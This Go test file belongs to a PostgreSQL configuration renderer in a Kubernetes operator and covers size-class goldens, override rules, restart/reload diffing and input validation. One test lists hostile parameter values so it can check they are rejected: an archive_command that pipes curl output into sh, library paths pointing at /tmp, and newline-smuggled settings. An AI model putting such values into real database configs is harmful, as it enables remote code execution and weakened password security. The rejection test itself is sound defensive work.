package pgconfig

import (
	"fmt"
	"maps"
	"slices"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"

	pgshardv1alpha1 "github.com/andrew01234567890/pgshard2/operator/api/v1alpha1"
)

const sharedBuffers2048 = "2048MB"

func renderToString(r Rendered) string {
	keys := slices.Sorted(maps.Keys(r.Parameters))
	var b strings.Builder
	fmt.Fprintf(&b, "cpu=%s memory=%s replicas=%d sync=%s/%d\n",
		r.Resources.Limits.Cpu(), r.Resources.Limits.Memory(),
		r.ReplicasPerShard, r.Synchronous.Mode, r.Synchronous.Number)
	for _, k := range keys {
		fmt.Fprintf(&b, "%s=%s\n", k, r.Parameters[k])
	}
	return b.String()
}

// Goldens inline: the derived config is load-bearing (its hash drives
// rolling restarts), so any change must be a conscious diff here.
var classGoldens = map[pgshardv1alpha1.SizeClass]string{
	"S": `cpu=1 memory=4Gi replicas=2 sync=off/0
archive_mode=on
checkpoint_completion_target=0.9
effective_cache_size=2867MB
effective_io_concurrency=256
hot_standby_feedback=on
io_method=worker
io_workers=3
maintenance_work_mem=256MB
max_connections=100
max_parallel_workers=1
max_replication_slots=18
max_wal_senders=18
max_wal_size=2GB
max_worker_processes=8
password_encryption=scram-sha-256
random_page_cost=1.1
shared_buffers=1024MB
sync_replication_slots=on
wal_compression=zstd
wal_level=logical
wal_log_hints=on
work_mem=10MB
`,
	"XL": `cpu=16 memory=128Gi replicas=5 sync=quorum/2
archive_mode=on
checkpoint_completion_target=0.9
effective_cache_size=91750MB
effective_io_concurrency=256
hot_standby_feedback=on
io_method=worker
io_workers=8
maintenance_work_mem=2048MB
max_connections=400
max_parallel_workers=16
max_replication_slots=21
max_wal_senders=21
max_wal_size=32GB
max_worker_processes=16
password_encryption=scram-sha-256
random_page_cost=1.1
shared_buffers=32768MB
sync_replication_slots=on
wal_compression=zstd
wal_level=logical
wal_log_hints=on
work_mem=81MB
`,
}

func TestClassGoldens(t *testing.T) {
	for class, want := range classGoldens {
		r, err := Render(Inputs{Class: class, SlotHeadroom: 16})
		if err != nil {
			t.Fatalf("%s: %v", class, err)
		}
		if got := renderToString(r); got != want {
			t.Errorf("%s golden mismatch:\n--- got ---\n%s--- want ---\n%s", class, got, want)
		}
	}
}

func TestRenderIsDeterministic(t *testing.T) {
	a, _ := Render(Inputs{Class: "M", SlotHeadroom: 8})
	b, _ := Render(Inputs{Class: "M", SlotHeadroom: 8})
	if a.ConfigHash != b.ConfigHash || a.ConfigHash == "" {
		t.Fatalf("hash not deterministic: %q vs %q", a.ConfigHash, b.ConfigHash)
	}
	c, _ := Render(Inputs{Class: "M", SlotHeadroom: 9})
	if c.ConfigHash == a.ConfigHash {
		t.Fatal("hash must change when derived parameters change")
	}
}

func TestUserParametersWinExceptPlatformFixed(t *testing.T) {
	r, err := Render(Inputs{
		Class: "S",
		UserParameters: map[string]string{
			ParamWorkMem:  "64MB",
			ParamWalLevel: "replica", // must not stick
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if r.Parameters[ParamWorkMem] != "64MB" {
		t.Errorf("user override lost: work_mem=%s", r.Parameters[ParamWorkMem])
	}
	if r.Parameters[ParamWalLevel] != logicalWalLevel {
		t.Errorf("platform-fixed parameter overridden: wal_level=%s", r.Parameters[ParamWalLevel])
	}
}

func TestOverridesApply(t *testing.T) {
	replicas := int32(4)
	r, err := Render(Inputs{
		Class: "M",
		Overrides: &pgshardv1alpha1.SizeOverrides{
			Resources: &corev1.ResourceRequirements{
				Limits: corev1.ResourceList{
					corev1.ResourceCPU:    resource.MustParse("2"),
					corev1.ResourceMemory: resource.MustParse("8Gi"),
				},
			},
			ReplicasPerShard: &replicas,
			Synchronous:      &pgshardv1alpha1.SynchronousSpec{Mode: "first", Number: 1},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if r.ReplicasPerShard != 4 || r.Synchronous.Mode != "first" {
		t.Fatalf("overrides not applied: %+v", r)
	}
	if r.Parameters[ParamSharedBuffers] != sharedBuffers2048 {
		t.Errorf("shared_buffers should derive from overridden memory: %s", r.Parameters[ParamSharedBuffers])
	}
}

func TestRejectsImpossibleSyncQuorum(t *testing.T) {
	n := int32(2)
	_, err := Render(Inputs{Class: "S", Overrides: &pgshardv1alpha1.SizeOverrides{
		Synchronous: &pgshardv1alpha1.SynchronousSpec{Mode: SyncQuorum, Number: 2}, ReplicasPerShard: &n,
	}})
	if err == nil {
		t.Fatal("quorum 2 with 2 replicas (1 standby) must be rejected")
	}
}

func TestClassifyDiff(t *testing.T) {
	old := map[string]string{ParamWorkMem: "10MB", ParamSharedBuffers: "1024MB", ParamRandomPageCost: ssdRandomPageCost}
	new := map[string]string{ParamWorkMem: "20MB", ParamSharedBuffers: sharedBuffers2048, ParamRandomPageCost: ssdRandomPageCost, "io_workers": "4"}
	reload, restart := ClassifyDiff(old, new)
	if fmt.Sprint(reload) != "[io_workers work_mem]" {
		t.Errorf("reload = %v", reload)
	}
	if fmt.Sprint(restart) != "[shared_buffers]" {
		t.Errorf("restart = %v", restart)
	}
}

func TestClassifyDiffUnknownParamDefaultsToRestart(t *testing.T) {
	// A postmaster-context GUC a user injects must be treated as restart-only,
	// or the change silently never applies.
	reload, restart := ClassifyDiff(
		map[string]string{"max_prepared_transactions": "0"},
		map[string]string{"max_prepared_transactions": "100"},
	)
	if len(reload) != 0 || fmt.Sprint(restart) != "[max_prepared_transactions]" {
		t.Errorf("unknown param must default to restart: reload=%v restart=%v", reload, restart)
	}
}

func TestClassifyDiffDetectsEmptyValueAddRemove(t *testing.T) {
	// Adding a key whose value is empty must not be conflated with "unchanged"
	// (a missing key reads back as "" too).
	_, restart := ClassifyDiff(map[string]string{}, map[string]string{"search_path": ""})
	if fmt.Sprint(restart) != "[search_path]" {
		t.Errorf("adding an empty-valued key must register as a change: restart=%v", restart)
	}
	reload, restart := ClassifyDiff(map[string]string{ParamWorkMem: ""}, map[string]string{})
	if fmt.Sprint(reload) != "[work_mem]" || len(restart) != 0 {
		t.Errorf("removing a key must register as a change: reload=%v restart=%v", reload, restart)
	}
}

func TestRejectsUnsafeUserParameters(t *testing.T) {
	cases := map[string]map[string]string{
		"execution GUC":         {"archive_command": "sh -c 'curl evil|sh'"},
		"preload library":       {"shared_preload_libraries": "/tmp/evil.so"},
		"archive library":       {"archive_library": "/tmp/evil"},
		"jit provider":          {"jit_provider": "/tmp/evil"},
		"ssl passphrase":        {"ssl_passphrase_command": "sh -c evil"},
		"include directive":     {"include": "/tmp/evil.conf"},
		"include dir directive": {"include_dir": "/tmp/evil.d"},
		"newline in value":      {"zz": "x\npassword_encryption = md5"},
		"malformed name":        {"bad name!": "1"},
		"newline in key":        {"zz\npassword_encryption": "md5"},
		"case/space dup":        {ParamWorkMem: "8MB", "WORK_MEM ": "16MB"},
	}
	for name, up := range cases {
		if _, err := Render(Inputs{Class: "M", UserParameters: up}); err == nil {
			t.Errorf("%s: expected rejection, got none", name)
		}
	}
}

func TestWhitespaceKeyCannotBypassPlatformFixed(t *testing.T) {
	// A case/whitespace variant normalizes onto the real key and is then
	// overridden by the platform-fixed value.
	r, err := Render(Inputs{Class: "S", UserParameters: map[string]string{"  WAL_LEVEL ": "minimal"}})
	if err != nil {
		t.Fatal(err)
	}
	if r.Parameters[ParamWalLevel] != logicalWalLevel {
		t.Errorf("platform-fixed wal_level bypassed: %s", r.Parameters[ParamWalLevel])
	}
}

func TestIoWorkersCappedAt32(t *testing.T) {
	r, err := Render(Inputs{Class: "M", Overrides: &pgshardv1alpha1.SizeOverrides{
		Resources: &corev1.ResourceRequirements{
			Limits: corev1.ResourceList{corev1.ResourceCPU: resource.MustParse("128")},
		},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if r.Parameters["io_workers"] != "32" {
		t.Errorf("io_workers not capped at 32: %s", r.Parameters["io_workers"])
	}
}

func TestWorkMemUsesOverriddenMaxConnections(t *testing.T) {
	r, err := Render(Inputs{Class: "M", UserParameters: map[string]string{ParamMaxConnections: "1000"}})
	if err != nil {
		t.Fatal(err)
	}
	// 16Gi/4/1000 is below the 4MB floor.
	if r.Parameters[ParamWorkMem] != "4MB" {
		t.Errorf("work_mem should follow overridden max_connections: %s", r.Parameters[ParamWorkMem])
	}
	if r.Parameters[ParamMaxConnections] != "1000" {
		t.Errorf("max_connections override lost: %s", r.Parameters[ParamMaxConnections])
	}
	// A quoted, internally-spaced value still drives sizing.
	rq, err := Render(Inputs{Class: "M", UserParameters: map[string]string{ParamMaxConnections: "' 1000 '"}})
	if err != nil {
		t.Fatal(err)
	}
	if rq.Parameters[ParamWorkMem] != "4MB" {
		t.Errorf("quoted max_connections should drive work_mem: %s", rq.Parameters[ParamWorkMem])
	}
}

func TestRequestsOnlyOverrideApplies(t *testing.T) {
	r, err := Render(Inputs{Class: "M", Overrides: &pgshardv1alpha1.SizeOverrides{
		Resources: &corev1.ResourceRequirements{
			Requests: corev1.ResourceList{corev1.ResourceMemory: resource.MustParse("8Gi")},
		},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if r.Parameters[ParamSharedBuffers] != sharedBuffers2048 {
		t.Errorf("requests-only memory override ignored: shared_buffers=%s", r.Parameters[ParamSharedBuffers])
	}
}

func TestRejectsZeroReplicas(t *testing.T) {
	zero := int32(0)
	if _, err := Render(Inputs{Class: "S", Overrides: &pgshardv1alpha1.SizeOverrides{ReplicasPerShard: &zero}}); err == nil {
		t.Fatal("zero replicasPerShard must be rejected")
	}
}

func TestMaxWorkerProcessesFlooredForLogicalReplication(t *testing.T) {
	r, err := Render(Inputs{Class: "S"})
	if err != nil {
		t.Fatal(err)
	}
	if r.Parameters["max_worker_processes"] != "8" {
		t.Errorf("max_worker_processes must be floored for logical replication: %s", r.Parameters["max_worker_processes"])
	}
}
